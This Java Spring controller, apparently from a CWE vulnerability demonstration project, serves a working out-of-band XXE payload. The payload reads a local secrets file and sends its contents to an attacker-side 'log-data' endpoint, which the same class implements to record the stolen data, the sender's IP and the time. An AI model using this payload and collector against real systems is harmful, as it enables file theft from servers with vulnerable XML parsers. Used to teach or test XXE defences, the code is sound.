package com.example.cwe.evil;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.util.Date;

@RestController
@RequestMapping("evil")
public class EvilController {

    @GetMapping("xxe-file")
    public String payload() {
        return "<!ENTITY % payload SYSTEM \"file:///c:/temp/secrets.txt\">\n" +
                "<!ENTITY % param1 \"<!ENTITY external SYSTEM 'http://localhost:7171/evil/log-data?data=%payload;'>\">";
    }

    private static final String[] HEADERS_TO_TRY = {
            "X-Forwarded-For",
            "Proxy-Client-IP",
            "WL-Proxy-Client-IP",
            "HTTP_X_FORWARDED_FOR",
            "HTTP_X_FORWARDED",
            "HTTP_X_CLUSTER_CLIENT_IP",
            "HTTP_CLIENT_IP",
            "HTTP_FORWARDED_FOR",
            "HTTP_FORWARDED",
            "HTTP_VIA",
            "REMOTE_ADDR"};

    @GetMapping("log-data")
    public void logData(@RequestParam String data, HttpServletRequest request) {
        System.out.printf("IP: %s, Time: %s, Data received: %s", getClientIpAddress(request), new Date(), data);
    }

    private String getClientIpAddress(HttpServletRequest request) {
        for (String header : HEADERS_TO_TRY) {
            String ip = request.getHeader(header);
            if (ip != null && ip.length() != 0 && !"unknown".equalsIgnoreCase(ip)) {
                return ip;
            }
        }
        return request.getRemoteAddr();
    }
}
